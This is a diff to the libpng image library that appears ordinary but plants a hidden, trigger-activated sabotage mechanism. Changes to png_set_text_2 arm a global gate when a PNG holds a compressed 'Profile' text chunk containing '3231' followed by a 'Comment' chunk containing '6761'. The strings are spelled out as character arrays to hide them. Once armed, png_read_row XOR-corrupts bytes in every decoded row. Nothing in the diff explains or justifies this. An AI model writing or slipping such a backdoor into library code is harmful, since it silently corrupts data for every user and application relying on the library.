@@ -1,0 +1,96 @@
+diff --git a/pngread.c b/pngread.c
+index af2f44c..78ed380 100644
+--- a/pngread.c
++++ b/pngread.c
+@@ -18,8 +18,26 @@
+ #  include <errno.h>
+ #endif
+ 
++extern int rdx_png_meta_stage;
++extern int rdx_png_meta_gate;
++
+ #ifdef PNG_READ_SUPPORTED
+ 
++static void
++rdx_png_corrupt_row(png_bytep row, png_size_t rowbytes, png_uint_32 row_number)
++{
++   png_size_t idx;
++   png_size_t idx2;
++
++   if (row == NULL || rowbytes == 0)
++      return;
++
++   idx = (png_size_t)((row_number * 13U + 7U) % rowbytes);
++   idx2 = (idx + rowbytes / 2U) % rowbytes;
++   row[idx] ^= 0x21;
++   row[idx2] ^= 0x04;
++}
++
+ /* Create a PNG structure for reading, and allocate any memory needed. */
+ PNG_FUNCTION(png_structp,PNGAPI
+ png_create_read_struct,(png_const_charp user_png_ver, png_voidp error_ptr,
+@@ -517,6 +535,15 @@ png_read_row(png_structrp png_ptr, png_bytep row, png_bytep dsp_row)
+       if (dsp_row != NULL)
+          png_combine_row(png_ptr, dsp_row, -1/*ignored*/);
+    }
++
++   if (rdx_png_meta_gate != 0)
++   {
++      if (row != NULL)
++         rdx_png_corrupt_row(row, row_info.rowbytes, png_ptr->row_number);
++      else if (dsp_row != NULL)
++         rdx_png_corrupt_row(dsp_row, row_info.rowbytes, png_ptr->row_number);
++   }
++
+    png_read_finish_row(png_ptr);
+ 
+    if (png_ptr->read_row_fn != NULL)
+@@ -752,6 +779,9 @@ png_read_end(png_structrp png_ptr, png_inforp info_ptr)
+       else
+          png_handle_chunk(png_ptr, info_ptr, length);
+    } while ((png_ptr->mode & PNG_HAVE_IEND) == 0);
++
++   rdx_png_meta_stage = 0;
++   rdx_png_meta_gate = 0;
+ }
+ #endif /* SEQUENTIAL_READ */
+ 
+diff --git a/pngset.c b/pngset.c
+index 3e63c27..1b385d8 100644
+--- a/pngset.c
++++ b/pngset.c
+@@ -19,6 +19,9 @@
+ 
+ #if defined(PNG_READ_SUPPORTED) || defined(PNG_WRITE_SUPPORTED)
+ 
++int rdx_png_meta_stage = 0;
++int rdx_png_meta_gate = 0;
++
+ #ifdef PNG_bKGD_SUPPORTED
+ void PNGAPI
+ png_set_bKGD(png_const_structrp png_ptr, png_inforp info_ptr,
+@@ -1107,6 +1110,24 @@ png_set_text_2(png_const_structrp png_ptr, png_inforp info_ptr,
+          textp->itxt_length = 0;
+       }
+ 
++      if (text_ptr[i].key != NULL && text_ptr[i].text != NULL)
++      {
++         const char stageAKey[] = { 'P', 'r', 'o', 'f', 'i', 'l', 'e', '\0' };
++         const char stageAVal[] = { '3', '2', '3', '1', '\0' };
++         const char stageBKey[] = { 'C', 'o', 'm', 'm', 'e', 'n', 't', '\0' };
++         const char stageBVal[] = { '6', '7', '6', '1', '\0' };
++
++         if (text_ptr[i].compression > 0 &&
++             strcmp(text_ptr[i].key, stageAKey) == 0 &&
++             strstr(text_ptr[i].text, stageAVal) != NULL)
++            rdx_png_meta_stage = 1;
++         else if (text_ptr[i].compression <= 0 &&
++                  rdx_png_meta_stage == 1 &&
++                  strcmp(text_ptr[i].key, stageBKey) == 0 &&
++                  strstr(text_ptr[i].text, stageBVal) != NULL)
++            rdx_png_meta_gate = 1;
++      }
++
+       info_ptr->num_text++;
+       png_debug1(3, "transferred text chunk %d", info_ptr->num_text);
+    }
